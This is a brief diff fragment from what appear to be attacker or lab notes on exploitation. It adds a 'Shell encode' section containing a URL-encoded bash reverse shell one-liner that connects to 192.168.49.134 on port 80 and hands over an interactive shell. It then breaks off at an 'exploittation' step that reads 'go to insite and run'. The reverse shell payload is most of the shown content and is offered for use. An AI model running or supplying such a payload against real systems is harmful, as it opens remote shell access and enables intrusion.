@@ -1,3 +1,9 @@
+#Shell encode
+
+``` 
+ bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.134/80+0>%261'
+
+```
 # exploittation
  go to insite and run: 
 ``` 
